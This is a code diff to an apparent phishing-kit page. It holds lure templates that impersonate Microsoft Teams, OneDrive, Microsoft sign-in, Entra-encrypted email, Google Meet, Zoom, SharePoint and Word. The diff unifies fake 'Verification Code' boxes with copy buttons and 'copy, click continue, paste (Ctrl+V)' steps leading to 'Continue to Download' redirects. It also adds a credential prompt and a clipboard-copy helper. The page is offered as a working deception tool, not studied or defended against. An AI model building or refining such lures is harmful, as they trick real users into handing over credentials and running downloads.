@@ -7,14 +7,14 @@
     <style>
         /* ================= BASE & VARIABLES ================= */
         :root {
-            --bg-dark: #3C3B6E;                     /* American flag navy */
-            --panel-bg: rgba(60, 59, 110, 0.85);    /* navy translucent */
+            --bg-dark: #3C3B6E;
+            --panel-bg: rgba(60, 59, 110, 0.85);
             --panel-border: rgba(255, 255, 255, 0.4);
             --text-main: #FFFFFF;
             --text-muted: #D6E4F0;
-            --accent-blue: #3C3B6E;                 /* navy */
-            --accent-red: #B22234;                  /* flag red */
-            --accent-green: #3C3B6E;                /* repurposed to navy */
+            --accent-blue: #3C3B6E;
+            --accent-red: #B22234;
+            --accent-green: #3C3B6E;
             --accent-gray: rgba(255,255,255,0.2);
             --input-bg: #FFFFFF;
             --input-text: #3C3B6E;
@@ -384,12 +384,12 @@
                     <h1 style="font-size: 20px; margin: 10px 0 5px;">Join Teams Meeting</h1>
                     <p style="font-size: 13px; color: #666; margin: 0 0 20px;">Please verify your identity to join this secure Teams meeting.</p>
                     <div class="tpl-code-box">
-                        <div class="tpl-code-box-label">Your meeting access code</div>
+                        <div class="tpl-code-box-label">Your Verification Code</div>
                         <div class="tpl-code-display">DMVAVM43D</div>
-                        <button class="tpl-copy-btn">Copy Code</button>
+                        <button class="tpl-copy-btn" onclick="copyCode(this)">Copy Code</button>
                     </div>
                     <ul class="tpl-instructions">
-                        <li><span class="tpl-step-num">1</span> Copy the access code above</li>
+                        <li><span class="tpl-step-num">1</span> Copy the verification code above</li>
                         <li><span class="tpl-step-num">2</span> Click the button below and continue with code</li>
                         <li><span class="tpl-step-num">3</span> Paste the code to verify and join the meeting</li>
                     </ul>
@@ -407,12 +407,12 @@
                     <h1 style="font-size: 20px; margin: 10px 0 5px;">Verify to access this file</h1>
                     <p style="font-size: 13px; color: #666; margin: 0 0 20px;">Please verify your identity to access and download your secure files from OneDrive.</p>
                     <div class="tpl-code-box" style="background-color: #3C3B6E;">
-                        <div class="tpl-code-box-label">Your Access Code</div>
+                        <div class="tpl-code-box-label">Your Verification Code</div>
                         <div class="tpl-code-display">DV9QR4BMG</div>
-                        <button class="tpl-copy-btn">Copy Code</button>
+                        <button class="tpl-copy-btn" onclick="copyCode(this)">Copy Code</button>
                     </div>
                     <ul class="tpl-instructions">
-                        <li><span class="tpl-step-num">1</span> Copy the access code above</li>
+                        <li><span class="tpl-step-num">1</span> Copy the verification code above</li>
                         <li><span class="tpl-step-num">2</span> Click the button below and continue with code</li>
                         <li><span class="tpl-step-num">3</span> Paste the code to verify your identity</li>
                     </ul>
@@ -432,10 +432,10 @@
                     <div class="tpl-code-box" style="background-color: #3C3B6E;">
                         <div class="tpl-code-box-label">Your Verification Code</div>
                         <div class="tpl-code-display">GDNSCLLP4</div>
-                        <button class="tpl-copy-btn" style="background-color: #B22234;">Copy Code</button>
+                        <button class="tpl-copy-btn" style="background-color: #B22234;" onclick="copyCode(this)">Copy Code</button>
                     </div>
                     <ul class="tpl-instructions">
-                        <li><span class="tpl-step-num" style="background-color: #B22234;">1</span> Copy the code above</li>
+                        <li><span class="tpl-step-num" style="background-color: #B22234;">1</span> Copy the verification code above</li>
                         <li><span class="tpl-step-num" style="background-color: #B22234;">2</span> Click continue and paste (Ctrl+V)</li>
                         <li><span class="tpl-step-num" style="background-color: #B22234;">3</span> Paste the code to verify your identity</li>
                     </ul>
@@ -453,12 +453,12 @@
                     <h1 style="font-size: 20px; margin: 10px 0 5px;">Review & Sign Document</h1>
                     <p style="font-size: 13px; color: #666; margin: 0 0 20px;">Please verify your identity to review and sign this document.</p>
                     <div class="tpl-code-box" style="background-color: #3C3B6E;">
-                        <div class="tpl-code-box-label">Your Access Code</div>
+                        <div class="tpl-code-box-label">Your Verification Code</div>
                         <div class="tpl-code-display">CDZU3XHSU</div>
-                        <button class="tpl-copy-btn">Copy Code</button>
+                        <button class="tpl-copy-btn" onclick="copyCode(this)">Copy Code</button>
                     </div>
                     <ul class="tpl-instructions">
-                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">1</span> Copy the access code above</li>
+                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">1</span> Copy the verification code above</li>
                         <li><span class="tpl-step-num" style="background-color: #3C3B6E;">2</span> Click the button below and continue with code</li>
                         <li><span class="tpl-step-num" style="background-color: #3C3B6E;">3</span> Paste the code to verify your identity</li>
                     </ul>
@@ -475,6 +475,16 @@
                     <div style="font-weight: 600; font-size: 14px; margin-bottom: 20px;">Microsoft</div>
                     <h1 style="font-size: 20px; margin: 10px 0 5px;">Sign in to your account</h1>
                     <p style="font-size: 13px; color: #666; margin: 0 0 20px;">Enter your credentials to access your secure workspace.</p>
+                    <div class="tpl-code-box" style="background-color: #3C3B6E;">
+                        <div class="tpl-code-box-label">Your Verification Code</div>
+                        <div class="tpl-code-display">MSFT7391</div>
+                        <button class="tpl-copy-btn" onclick="copyCode(this)">Copy Code</button>
+                    </div>
+                    <ul class="tpl-instructions">
+                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">1</span> Copy the verification code above</li>
+                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">2</span> Click the button below and continue with code</li>
+                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">3</span> Paste the code to verify your identity</li>
+                    </ul>
                     <div class="input-group" style="margin-bottom: 15px;">
                         <input type="email" placeholder="Email, phone, or Skype" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px;">
                     </div>
@@ -511,6 +521,16 @@
                             </div>
                             <h3 style="margin: 0 0 12px; font-size: 20px; color: #242424;">Encrypted Message</h3>
                             <p style="margin: 0 0 24px; font-size: 14px; color: #555;">This email is protected with Microsoft Entra ID. Please verify your identity to view the content.</p>
+                            <div class="tpl-code-box" style="background-color: #3C3B6E; max-width: 320px; margin: 0 auto 24px;">
+                                <div class="tpl-code-box-label">Your Verification Code</div>
+                                <div class="tpl-code-display">OTP4821</div>
+                                <button class="tpl-copy-btn" onclick="copyCode(this)">Copy Code</button>
+                            </div>
+                            <ul class="tpl-instructions" style="max-width: 320px; margin: 0 auto 24px;">
+                                <li><span class="tpl-step-num" style="background-color: #3C3B6E;">1</span> Copy the verification code above</li>
+                                <li><span class="tpl-step-num" style="background-color: #3C3B6E;">2</span> Click continue and paste the code</li>
+                                <li><span class="tpl-step-num" style="background-color: #3C3B6E;">3</span> Paste the code to unlock the message</li>
+                            </ul>
                             <button class="tpl-primary-btn" style="background-color: #3C3B6E; width: auto; padding: 12px 24px; margin: 0 auto;" onclick="simulateRedirect()">Continue to Download</button>
                         </div>
                     </div>
@@ -527,12 +547,12 @@
                     <h1 style="font-size: 20px; margin: 10px 0 5px;">Join a Meeting</h1>
                     <p style="font-size: 13px; color: #666; margin: 0 0 20px;">Please verify your identity to join this secure Google Meet session.</p>
                     <div class="tpl-code-box" style="background-color: #3C3B6E;">
-                        <div class="tpl-code-box-label">Your meeting access code</div>
+                        <div class="tpl-code-box-label">Your Verification Code</div>
                         <div class="tpl-code-display">GMEET123</div>
-                        <button class="tpl-copy-btn">Copy Code</button>
+                        <button class="tpl-copy-btn" onclick="copyCode(this)">Copy Code</button>
                     </div>
                     <ul class="tpl-instructions">
-                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">1</span> Copy the access code above</li>
+                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">1</span> Copy the verification code above</li>
                         <li><span class="tpl-step-num" style="background-color: #3C3B6E;">2</span> Click the button below and continue with code</li>
                         <li><span class="tpl-step-num" style="background-color: #3C3B6E;">3</span> Paste the code to verify and join the meeting</li>
                     </ul>
@@ -550,14 +570,14 @@
                     <h1 style="font-size: 20px; margin: 10px 0 5px;">Join Zoom Meeting</h1>
                     <p style="font-size: 13px; color: #666; margin: 0 0 20px;">Please verify your identity to join this secure Zoom meeting.</p>
                     <div class="tpl-code-box" style="background-color: #3C3B6E;">
-                        <div class="tpl-code-box-label">Your meeting ID</div>
+                        <div class="tpl-code-box-label">Your Verification Code</div>
                         <div class="tpl-code-display">882 1234 5678</div>
-                        <button class="tpl-copy-btn">Copy ID</button>
+                        <button class="tpl-copy-btn" onclick="copyCode(this)">Copy Code</button>
                     </div>
                     <ul class="tpl-instructions">
-                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">1</span> Copy the meeting ID above</li>
-                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">2</span> Click the button below and continue with ID</li>
-                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">3</span> Paste the ID to verify and join the meeting</li>
+                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">1</span> Copy the verification code above</li>
+                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">2</span> Click the button below and continue with code</li>
+                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">3</span> Paste the code to verify and join the meeting</li>
                     </ul>
                     <button class="tpl-primary-btn" style="background-color: #3C3B6E;" onclick="simulateRedirect()">Continue to Download</button>
                 </div>
@@ -573,12 +593,12 @@
                     <h1 style="font-size: 20px; margin: 10px 0 5px;">Access Shared File</h1>
                     <p style="font-size: 13px; color: #666; margin: 0 0 20px;">Please verify your identity to access this shared SharePoint document.</p>
                     <div class="tpl-code-box" style="background-color: #3C3B6E;">
-                        <div class="tpl-code-box-label">Your Access Code</div>
+                        <div class="tpl-code-box-label">Your Verification Code</div>
                         <div class="tpl-code-display">SPO98765</div>
-                        <button class="tpl-copy-btn">Copy Code</button>
+                        <button class="tpl-copy-btn" onclick="copyCode(this)">Copy Code</button>
                     </div>
                     <ul class="tpl-instructions">
-                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">1</span> Copy the access code above</li>
+                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">1</span> Copy the verification code above</li>
                         <li><span class="tpl-step-num" style="background-color: #3C3B6E;">2</span> Click the button below and continue with code</li>
                         <li><span class="tpl-step-num" style="background-color: #3C3B6E;">3</span> Paste the code to verify your identity</li>
                     </ul>
@@ -596,12 +616,12 @@
                     <h1 style="font-size: 20px; margin: 10px 0 5px;">Open Document</h1>
                     <p style="font-size: 13px; color: #666; margin: 0 0 20px;">Please verify your identity to open this secure Word document.</p>
                     <div class="tpl-code-box" style="background-color: #3C3B6E;">
-                        <div class="tpl-code-box-label">Your Access Code</div>
+                        <div class="tpl-code-box-label">Your Verification Code</div>
                         <div class="tpl-code-display">WORD2024</div>
-                        <button class="tpl-copy-btn">Copy Code</button>
+                        <button class="tpl-copy-btn" onclick="copyCode(this)">Copy Code</button>
                     </div>
                     <ul class="tpl-instructions">
-                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">1</span> Copy the access code above</li>
+                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">1</span> Copy the verification code above</li>
                         <li><span class="tpl-step-num" style="background-color: #3C3B6E;">2</span> Click the button below and continue with code</li>
                         <li><span class="tpl-step-num" style="background-color: #3C3B6E;">3</span> Paste the code to verify your identity</li>
                     </ul>
@@ -792,6 +812,14 @@
             try { document.execCommand('copy'); } catch (e) {}
             document.body.removeChild(ta);
             if (cb) cb();
+        }
+
+        // ---- Copy the "Your Verification Code" value from any template ----
+        function copyCode(btn) {
+            const box = btn.closest('.tpl-code-box');
+            const el = box ? box.querySelector('.tpl-code-display') : null;
+            if (!el) return;
+            clipboardCopy(el.textContent.trim(), btn);
         }
 
         function cleanDomain(raw) {
